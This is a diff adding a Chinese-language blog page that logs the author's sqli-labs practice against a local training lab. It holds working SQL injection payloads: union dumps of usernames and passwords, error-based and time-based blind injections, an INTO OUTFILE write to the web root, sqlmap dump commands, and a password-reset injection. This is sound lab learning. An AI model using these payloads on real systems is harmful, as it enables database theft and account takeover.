@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"x4297.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="记录一下sqli-labs相关的练习 less-1靶场搭建在本地虚拟机上，url为 http:&#x2F;&#x2F;game.local.com&#x2F;sqli-labs-master&#x2F; （仅本地可访问） 字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码 1http:&#x2F;&#x2F;game.local.com&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&amp;#x2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs记录">
+<meta property="og:url" content="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="x4297&#39;s blog">
+<meta property="og:description" content="记录一下sqli-labs相关的练习 less-1靶场搭建在本地虚拟机上，url为 http:&#x2F;&#x2F;game.local.com&#x2F;sqli-labs-master&#x2F; （仅本地可访问） 字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码 1http:&#x2F;&#x2F;game.local.com&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;&amp;#x2">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-24T15:07:32.000Z">
+<meta property="article:modified_time" content="2022-01-27T09:33:39.041Z">
+<meta property="article:author" content="x4297">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>sqli-labs记录 | x4297's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">x4297's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录美好生活</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/24/sqli-labs%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sqli-labs记录
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-01-24 23:07:32" itemprop="dateCreated datePublished" datetime="2022-01-24T23:07:32+08:00">2022-01-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-27 17:33:39" itemprop="dateModified" datetime="2022-01-27T17:33:39+08:00">2022-01-27</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>记录一下sqli-labs相关的练习</p>
+<h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p>靶场搭建在本地虚拟机上，url为 <a target="_blank" rel="noopener" href="http://game.local.com/sqli-labs-master/">http://game.local.com/sqli-labs-master/</a> （仅本地可访问）</p>
+<p>字符型，需要闭合单引号。url中 + 表示空格（url解码后 + 变为空格）如果使用 井号 需要url编码</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://game.local.com/sqli-labs-master/Less-<span class="number">1</span>/?id=&#x27; union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>因为此网页只显示查询到的第一条记录，所以如果想要回显所有查询到的数据，需要使用 mysql的 <code>group_concat</code> 函数 或者 最后加上 <code>limit 5,1</code> （5换成别的数字，从0开始计数，5表示查看第6条记录）一条一条查看</p>
+<p>正常查询查了三列，所以联合查询也得查三列。三列是通过 order by 是否报错判断出来的。其中2和3 有回显。</p>
+<p>数据库名（security），之后为了更加简洁明了，只给出 url 中的 查询字符串</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="number">1</span>,database(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>表名 （mysql中才能这么查）</p>
+<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>
+
+<p>选择表 users ，查列名</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=<span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security&#x27; <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure>
+
+<p>知道有 id，username，password 这3列，一次查出所有数据</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; union <span class="keyword">select</span> <span class="number">1</span>,group_concat(concat_ws(<span class="string">&#x27;--&#x27;</span>,id, username, <span class="keyword">password</span>) separator <span class="string">&#x27;..&#x27;</span>),<span class="number">3</span> <span class="keyword">from</span> users--+</span><br></pre></td></tr></table></figure>
+
+<p>concat_ws 表示 with separator ，可以指定分隔符，第一个参数就是分隔符</p>
+<p>group_concat 也可以指定分隔符，但是是在最后加上 separator ‘指定的分隔符’</p>
+<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p>数字型</p>
+<p>使用谷歌浏览器插件 hackbar，看得比较舒服</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p>和sql语句构造相关的php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>‘’$id’ 用括号包裹，闭合单引号后还要闭合圆括号</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p>在 less-3 的基础上，把单引号换成了双引号</p>
+<p>php代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>url</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&quot;) union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p>此页面若是查询到数据，则会多显示出一行 <code>You are in...........</code> （不需要sql语句查询到的记录有且仅有一条，可以查询到多条记录），而且会显示sql语句的报错信息。由此想到可以使用布尔盲注或者报错注入。</p>
+<p>盲注比较麻烦，所以先使用报错注入，盲注后面应该有机会用到</p>
+<p>使用的数据库为 mysql 版本为 5.7.26</p>
+<p>给出三个可以用于mysql报错注入的sql语句，payload为user()，使用时换成自己想要的</p>
+<p>报错原因大体为 rand(0) 伪随机序列导致临时表中主键重复，想要深入了解可以网上查一下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="keyword">user</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br></pre></td></tr></table></figure>
+
+<p>以下两个函数 extractvalue 和 updatexml 与 xml 相关，报错原因是xpath语法错误</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)))</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<p>报错注入时，sql语句不能有语法错误。给出一种简单的使用方法，0x7e 表示 ‘~’ （报错信息中，两个波浪线中间的就是 database() ）</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> database()),<span class="number">0</span>x7e),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>hackbar 中有 updatexml 报错注入的模板</p>
+<p>看了一眼标题，double injection ，我还以为是 二次注入 还是 二次编码</p>
+<p>网上查了一下 double injection ，有人说是因为有两个select所以叫双查询？？？</p>
+<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>同 less-5 单引号换成双引号</p>
+<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>id=1时提示</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are <span class="keyword">in</span><span class="params">...</span>. Use outfile<span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
+
+<p>id=-1时提示</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have <span class="keyword">an</span> <span class="keyword">error</span> <span class="keyword">in</span> your SQL <span class="keyword">syntax</span></span><br></pre></td></tr></table></figure>
+
+<p>猜测 没查询到数据 以及 sql语句语法错误 都提示 “You have an error in your SQL syntax”</p>
+<p>不显示报错信息所以无法使用报错注入。不过根据 id 的值是否在数据库中，返回不同的页面，所以应该也可以使用布尔盲注，但既然给了提示使用 outfile ，那就先试试 outfile</p>
+<p>使用 outfile 之前，先要修改 mysql 的配置文件 （可以在启动mysql时使用命令行参数，但感觉不是很方便）</p>
+<table>
+<thead>
+<tr>
+<th align="left">secure_file_priv 的值</th>
+<th>解释</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">(NULL)</td>
+<td>我使用的mysql版本默认值为这个，配置文件中没有 secure_file_priv 就为这个值</td>
+<td>不允许使用 outfile</td>
+</tr>
+<tr>
+<td align="left">‘’</td>
+<td>配置文件中直接 secure_file_priv=  或者 ‘’ 或者 “” 都是这个</td>
+<td>允许 outfile 将文件导出到任意目录（可能还需要mysql有相关权限吧。使用的是windows系统，不太熟悉windows的权限管理）</td>
+</tr>
+<tr>
+<td align="left">‘c:/test’</td>
+<td>一个具体的路径</td>
+<td>只允许将文件导出到指定目录及其子目录</td>
+</tr>
+</tbody></table>
+<p>mysql运行时查询该变量的值，变量名不太记得可以用通配符 ‘%’，运行时无法在mysql中使用set修改该变量</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW <span class="keyword">VARIABLES</span> LIKE <span class="comment">&#x27;secure_file_priv&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导出路径可以是 绝对路径 也可以是 相对路径</p>
+<p>绝对路径没什么好说的，相对路径则和配置文件中的 datadir 有关</p>
+<p>假设 datadir=c:/home/test_of_outfile ，sqli-labs使用的数据库名为 security</p>
+<p>相对路径 ‘test1.txt’ 导出的文件存放在 c:/home/test_of_outfile/security/test1.txt</p>
+<p>同样，datadir 也不能使用 set 修改，可以在配置文件中修改</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，如果修改 datadir 修改后，要将原来datadir中的文件拷贝到新的datadir中，否则mysql无法启动</span><br></pre></td></tr></table></figure>
+
+<p>推荐一款软件，Everything ，可以查找计算机上的文件，还挺快的，一开始不知道相对路径是相对哪，就是拿这个找的</p>
+<p>输出文件要选个可以访问的路径，我放在了网站的根目录下。因为sql语句执行没有返回数据，所以会提示错误，但文件已经导出了</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="string">&#x27;)) union select &#x27;</span>a<span class="string">&#x27;,&#x27;</span><span class="string">b&#x27;,&#x27;</span>c<span class="string">&#x27; union select 1,2,3 into outfile &#x27;</span>C:<span class="regexp">/tools/</span>phpstudy_pro<span class="regexp">/WWW/</span>test111.txt<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>文件内容 16进制表示为（0x0A 是 换行符LF (\n) win7记事本中显示不出来，windows中的换行是CRLF (\r\n) ，0x09 是水平制表符 (\t) ）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">61</span> <span class="number">09</span> <span class="number">62</span> <span class="number">09</span> <span class="number">63</span> <span class="number">0</span>A <span class="number">31</span> <span class="number">09</span> <span class="number">32</span> <span class="number">09</span> <span class="number">33</span> <span class="number">0</span>A</span><br></pre></td></tr></table></figure>
+
+
+
+<p>测试是单引号还是双引号时，可以使用</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1&#x27;</span><br><span class="line">?<span class="attribute">id</span>=1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>有数据的表示不是使用这种引号</p>
+<p>mysql中的字符型和整型比较，有点像php的弱类型比较</p>
+<p>1 == ‘1abc’</p>
+<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>也可以outfile</p>
+<p>标题上面写了盲注</p>
+<p>那就试试sqlmap的布尔盲注吧</p>
+<p>我是用 pip 安装的 sqlmap，发现安装完之后在python的安装目录下的 Scripts 中有一个 sqlmap.exe ，然后这个目录又在环境变量Path中，所以可以直接  <code> sqlmap -u url</code> 而不需要 <code>python sqlmap.py -u</code> 。</p>
+<p>顺便提一嘴，sqlmap.py 中第一行指定了解释器，所以命令行里面可以直接运行 sqlmap.py 而不是作为python的命令行参数。但第一行指定的解释器文件名是 python，如果把 python.exe 改成了 python3.exe，就不能运行了，sqlmap.exe也不能运行了</p>
+<figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>运行如下命令，运行过程中会有几个选项，[y/N] 代表 y(es) 或 n(o) ，大写表示默认值，大部分情况直接回车使用默认值即可。–technique表示使用什么方法，B表示布尔盲注</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B</span><br></pre></td></tr></table></figure>
+
+<p>运行完一次后会有缓存文件，记录之前的结果，再接着看当前数据库</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B --current-db</span><br></pre></td></tr></table></figure>
+
+<p>看表名 -D 后面指定数据库名字</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security --tables</span><br></pre></td></tr></table></figure>
+
+<p>列名 -T 后面指定表名</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security -T emails --columns</span><br></pre></td></tr></table></figure>
+
+<p>最后，查看emails中的数据，-C 指定列名</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">8</span>/?id=<span class="number">1</span> --technique=B -D security -T emails -C id,email_id --dump</span><br></pre></td></tr></table></figure>
+
+
+
+<p>url 可以用双引号包裹，但不能用单引号，我用单引号直接提示我 invalid target URL</p>
+<p>生成的缓存文件的目录以单引号开头</p>
+<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>不管id为什么，都是一样的界面。尝试基于时间的盲注。这种方法是最耗时间的</p>
+<p>判断单双引号还是整型，if函数 类似三元运算符  (1==1) ? sleep(1) : 0</p>
+<p>sql语句若是错误则不会调用sleep函数，响应时间就没那么久</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=&#x27; <span class="keyword">or</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">1</span>,sleep(<span class="number">1</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p>虽然是sleep(1)，但响应时间有点小久，不知道是为什么</p>
+<p>sqlmap把–technique=B 改为 =T ，其他和less-8一样，但是要花比较长的时间，有[Y/n]选一下就好，一般默认值就行</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http:<span class="regexp">//g</span>ame.local.com<span class="regexp">/sqli-labs-master/</span>Less-<span class="number">9</span>/?id=<span class="number">1</span> --technique=T --current-db</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>同 less-9 ，单引号改双引号</p>
+<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p>http请求方法改为post</p>
+<p>有报错信息</p>
+<p>报错注入，在表单任意一个字段 (Username 或 Password)中填入，表单中 + 不能代表空格，井号也不需要url编码，所以直接用井号注释</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; <span class="keyword">or</span> <span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>get改为post其实没有什么区别，基本上一样吧，感觉有点水</p>
+<p>分屏写的，浏览器下面一半hackbar，上面一半网页，屏幕太小，没看到登录成功或者失败的信息，我还以为怎么get改post都放在不同的lesson，却直接跳到了报错注入，不从字符型开始水一遍</p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h1><p>sqli-labs 前面这些表单都没有检查是否有数据，所以有一个字段直接空着也行。有些和之前使用get时基本一致，所以 开摆！</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;) or 1=1#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>报错注入</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) <span class="keyword">or</span> <span class="built_in">updatexml</span>(<span class="number">1</span>,<span class="built_in">concat</span>(<span class="number">0x7e</span>,(<span class="built_in">select</span> <span class="built_in">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>盲注</p>
+<p>sqlmap  get 和 post 使用方法不太一样</p>
+<p>常用的方法是 burp suite 抓个包，把http请求保存在一个文件里，然后 <code>-r &quot;&lt;path&gt;&quot;</code> 让sqlmap从文件中读取数据</p>
+<p>但我刚好不太想打开burp suite，所以试试别的方法</p>
+<p>–from参数，自动探测表单，一路狂回车</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://game.local.com/sqli-labs-master/Less-15/&quot;</span> <span class="params">--forms</span> <span class="params">--current-db</span> <span class="params">--technique=T</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>–data=”<params>“，手动指定参数</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://game.local.com/sqli-labs-master/Less-15/&quot;</span> <span class="params">--data=</span><span class="string">&quot;uname=1&amp;passwd=2&amp;submit=Submit&quot;</span> <span class="params">--current-db</span> <span class="params">--technique=T</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>sqlmap 布尔盲注成不了，可能是因为登录成功和登录失败最明显的就一个图片的url不一样，相差不大，sqlmap 判断不出来，虽然在浏览器里看得很明显。</p>
+<h1 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h1><p>好像就多个括号？</p>
+<p>摆了</p>
+<h1 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h1><p>注入点变了，看到修改密码觉得有update语句，然后没有token 又不验证旧密码，csrf</p>
+<p>查看源代码，username必须是数据库中已有数据，否则什么信息都不给</p>
+<p>username对了之后就有报错信息，可以报错注入</p>
+<p>new password 如下时可以进行基于时间的盲注。sleep(1) 好像表示暂停10秒，不是一秒，sleep函数太多记混了（后来测试又是1秒？？不知道是什么情况，之前测试sleep(3) 等了半分钟）</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span>&#x27; <span class="built_in">where</span> <span class="built_in">sleep</span>(<span class="number">1</span>)<span class="meta">#</span></span><br></pre></td></tr></table></figure>
+
+<p>布尔盲注好像不太行，username 有过滤，而username对了之后，只要不报错，显示的页面都一样</p>
+<p>new password值如下时，可修改所有用户的密码，也就是加了个 ‘#</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">456</span>&#x27;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>有个有意思的东西，他直接把数据库中查出来的数据拼接到sql语句中，可以试一下二次注入</p>
